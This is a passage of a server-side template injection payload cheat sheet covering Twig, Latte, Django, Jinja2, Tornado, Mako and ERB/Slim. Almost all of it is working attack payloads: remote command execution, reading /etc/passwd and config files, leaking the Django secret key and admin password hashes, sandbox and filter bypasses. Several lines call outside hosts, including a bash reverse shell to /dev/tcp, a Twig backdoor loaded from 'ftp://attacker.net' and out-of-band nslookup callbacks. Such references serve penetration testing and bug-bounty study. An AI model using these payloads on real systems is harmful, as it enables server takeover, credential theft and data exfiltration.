```php
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Twig - Template Format

```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Twig - Arbitrary File Reading

```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### Twig - Code Execution

```php
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}

{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0

{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0

{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
```

With certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in these cases:

```php
{{ {'id':'shell_exec'}|map('call_user_func')|join }}
```

Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

Example with an email passing FILTER_VALIDATE_EMAIL PHP.

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

### Twig - Code Execution with Obfuscation

Twig's block feature and built-in `_charset` variable can be nesting can be used to produced the payload (command: `id`)

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

The following payload, which harnesses the built-in `_context` variable, also achieves RCE – provided that the template engine performs a double-rendering process:

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

---

## Latte

> Universal payloads also work for Latte.

### Latte - Basic Injection

```php
{var $X="POC"}{$X}
```

### Latte - Code Execution

```php
{php system('nslookup oastify.com')}
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib and HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.

controller:

```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```

page template:

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

layout template:

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```


---

# Server Side Template Injection - Python

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| Bottle        | `{{ }}`        |
| Chameleon     | `${ }`         |
| Cheetah       | `${ }`         |
| Django        | `{{ }}`        |
| Jinja2        | `{{ }}`        |
| Mako          | `${ }`         |
| Pystache      | `{{ }}`        |
| Tornado       | `{{ }}`        |

## Universal Payloads

Generic code injection payloads work for many Python-based template engines, such as Bottle, Chameleon, Cheetah, Mako and Tornado.

To use these payloads, wrap them in the appropriate tag.

```python
__include__("os").popen("id").read() # Rendered RCE
getattr("", "x" + __include__("os").popen("id").read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE
```

## Django

Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.

### Django - Basic Injection

```python
{% csrf_token %} # Causes error with Jinja2
{{ 7*7 }}  # Error with Django Templates
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

### Django - Cross-Site Scripting

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Django - Debug Information Leak

```python
{% debug %}
```

### Django - Leaking App's Secret Key

```python
{{ messages.storages.0.signer.key }}
```

### Django - Admin Site URL leak

```python
{% include 'admin/base.html' %}
```

### Django - Admin Username And Password Hash Leak

```ps1
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2

[Official website](https://jinja.palletsprojects.com/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  

### Jinja2 - Basic Injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on a Flask application.

### Jinja2 - Template Format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Jinja2 - Debug Statement

If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.

```python
<pre>{% debug %}</pre>
```

Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### Jinja2 - Dump All Used Classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Access `__globals__` and `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - Dump All Config Variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - Read Remote File

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - Write Into Remote File

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - Remote Command Execution

Listen for connection

```bash
nc -lnvp 8000
```

#### Jinja2 - Forcing Output On Blind RCE

You can import Flask functions to return an output from the vulnerable page.

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### Exploit The SSTI By Calling os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Similar payloads could be used for Error-Based and Boolean-Based exploitation:

```python
{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based
{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }} # Boolean-Based
```

With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

#### Exploit The SSTI By Calling subprocess.Popen

:warning: the number 396 will vary depending of the application.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### Exploit The SSTI By Calling Popen Without Guessing The Offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### Exploit The SSTI By Writing An Evil Config File

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - Remote Command Execution with Obfuscation

Write the string: `id` using the index position of a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`.

Execute the system command `id`:

```python
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

### Jinja2 - Filter Bypass

```python
request.__class__
request["__class__"]
```

Bypassing `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

Bypassing `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassing `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado

> Universal payloads also work for Tornado.

### Tornado - Basic Injection

```py
{{7*7}}
{{7*'7'}}
```

### Tornado - Remote Command Execution

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako

> Universal payloads also work for Mako.

[Official website](https://www.makotemplates.org/)
> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - Remote Command Execution

Any of these payloads allows direct access to the `os` module

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

### Mako - Remote Command Execution with Obfuscation

In Mako, the following payload can be used to generates the string "id": `${str().join(chr(i)for(i)in[105,100])}`.

Execute the system command `id`:

```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

```python
<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).


---

# Server Side Template Injection - Ruby

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| Erb           | `<%= %>`       |
| Erubi         | `<%= %>`       |
| Erubis        | `<%= %>`       |
| HAML          | `#{ }`         |
| Liquid        | `{{ }}`        |
| Mustache      | `{{ }}`        |
| Slim          | `#{ }`         |

## Universal Payloads

Generic code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.

To use these payloads, wrap them in the appropriate tag.

```ruby
%x('id') # Rendered RCE
File.read("Y:/A:/"+%x('id')) # Error-Based RCE
1/(system("id")&&1||0) # Boolean-Based RCE
system("id && sleep 5") # Time-Based RCE
```

## Ruby

### Ruby - Basic injections

**ERB**:

```ruby
<%= 7 * 7 %>
```

**Slim**:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Remote Command execution

Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for **Slim** engine.

```powershell
#{ %x|env| }
```
